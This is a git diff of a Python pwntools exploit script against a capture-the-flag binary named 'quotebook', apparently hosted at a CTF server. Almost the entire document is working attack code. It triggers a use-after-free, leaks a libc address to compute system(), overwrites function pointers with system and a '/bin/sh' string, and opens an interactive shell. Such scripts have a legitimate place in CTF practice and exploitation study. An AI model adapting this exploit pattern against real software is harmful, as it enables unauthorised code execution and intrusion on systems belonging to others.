@@ -2,8 +2,14 @@
 import pwn
 import os
 
+remote = False
 
-libc = pwn.ELF("./libc.so.6")
+if remote:
+    libc = pwn.ELF("./libc.so.6")
+    s = pwn.remote("challs.dvc.tf", 2222)
+else:
+    libc = pwn.ELF("/usr/lib/libc.so.6")
+    s = pwn.process("./quotebook")
 
 def insert_dummy_quote(s):
     s.sendline("2")
@@ -21,11 +27,7 @@ def del_quote(idx):
     s.sendline("5")
     s.recv()
     s.sendline("%d" % idx)
-    print(s.recv())
-"""
-s = pwn.process("./quotebook")
-"""
-s = pwn.remote("challs.dvc.tf", 2222)
+    print(s.recvuntil('number >'))
 
 s.recv()
 for i in range(3):
@@ -40,16 +42,15 @@ print("List quotes")
 s.sendline("1")
 print(s.recvuntil('number > '))
 
-print("WTFBBQ")
 # Craft UAF with title overwriting first quote_t structure
 s.sendline("2")
-print(s.recv())
+print(s.recvuntil('size > '))
 # title size
 s.sendline("1")
-s.recv()
+print(s.recvuntil(' size > '))
 # content size
 s.sendline("48")
-s.recv()
+s.recvuntil('Title > ')
 
 #### Craft structure to leak libc ###
 # Pack content and content size (puts addr in PLT)
@@ -61,58 +62,39 @@ buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)
 
 # send title
 s.sendline("a")
-print(str(s.recv(), 'ascii'))
-
+print(str(s.recvuntil('Content > '), 'ascii'))
 # send content
 s.sendline(buf)
-print(str(s.recv(), 'ascii'))
+print(str(s.recvuntil('Choice number > '), 'ascii'))
 
-# Display quote and trigger UAF
-s.recv()
+# Trigger UAF by displaying first quote (which contains our crafted quote_t)
 s.sendline("3")
 print(s.recv())
 s.sendline("1")
 
-leaks_yolo = s.recv()
-print("THIS IS SPARTAPZ")
-print(leaks_yolo)
-puts_leak = leaks_yolo[4:4+6]
-print(puts_leak)
-addr = pwn.unpack(puts_leak, 48)
+# Compute system() address
+leak = s.recvline()
+puts_leak = leak[4:4+6]
+addr = pwn.unpack(puts_leak, len(puts_leak)*8)
 libc_base = addr - libc.symbols["printf"]
 system_addr = libc_base + libc.symbols["system"]
 print("%x" % system_addr)
 
+# Edit the second quote so we can control first's quote buf
 s.sendline("4")
 s.recv()
 s.sendline("2")
+# Craft our content buffer
 b = b"/bin/sh\x00" + pwn.pack(1, 64)
+# Padding to reach function pointers
 b += b"A"* 16
-print(len(b))
 b += pwn.pack(system_addr, 64) * 2
 s.sendline(b)
-print(str(s.recv(), 'ascii'))
+s.recvuntil('Choice number > ')
 
-s.sendline("3")
-print(str(s.recv(), 'ascii'))
+# Edit the first quote to trigger system()
+s.sendline("4")
+s.recvuntil('Quote number > ')
 s.sendline("1")
-s.interactive()
-
-#b = b"/bin/sh\x00"
-b = pwn.pack(0x4020c9, 64)*4
-b = b + b"\x00" * (256 - len(b))
-b += pwn.pack(system_addr, 64) * 2
-s.sendline(buf)
-print(str(s.recv(), 'ascii'))
-# send content
-s.sendline("a")
-print(str(s.recv(), 'ascii'))
-
-s.sendline("1")
-print(s.recv())
-
-
-s.sendline("3")
-print(str(s.recv(), 'ascii'))
-s.sendline("1")
+# Get the shell
 s.interactive()
